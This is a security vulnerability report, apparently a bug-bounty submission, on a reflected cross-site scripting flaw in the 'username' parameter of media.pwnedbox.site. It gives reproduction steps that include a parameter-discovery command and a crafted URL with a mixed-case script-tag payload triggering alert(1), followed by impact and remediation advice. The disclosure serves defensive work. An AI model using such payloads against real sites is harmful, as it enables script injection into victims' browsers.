## Title
Reflected XSS - media.pwnedbox.site

## Description
The `username` GET parameter on `media.pwnedbox.site` was found vulnerable to Reflected Cross-Site Scripting (XSS). A crafted JavaScript payload using a mixed-case script tag successfully triggered an `alert(1)` dialog in the browser.

## Steps to Reproduce

1. Open a terminal and execute the following command to discover GET parameters:

   ```bash
   echo "https://media.pwnedbox.site/index.php/" | x8scan -w params.txt
   ```

2. Observe the transformed GET URL generated by `x8scan`:

   ```text
   https://media.pwnedbox.site/index.php/?username=x8scan1
   ```

3. Open the following crafted URL in a browser:

   ```text
   https://media.pwnedbox.site/index.php/?username=hakama%27%22%3C%3E%3CscRIpt%3Ealert(1)%3C/scRIpt%3E
   ```

4. Allow the page to load.

5. Observe the JavaScript alert dialog displaying `1`, confirming successful JavaScript execution.

6. Dismiss the alert dialog.

## Impact

- An attacker can craft a malicious URL and trick victims into opening it.
- Successful exploitation allows JavaScript execution in the victim's browser.
- The vulnerability may be abused for phishing or manipulation of displayed webpage content.

## Remediation

- Apply context-aware output encoding to the `username` parameter before rendering its value in HTML.
- Validate and sanitize user-controlled input to prevent injection of executable HTML and JavaScript.
- Implement a restrictive Content Security Policy (CSP) as an additional security measure.
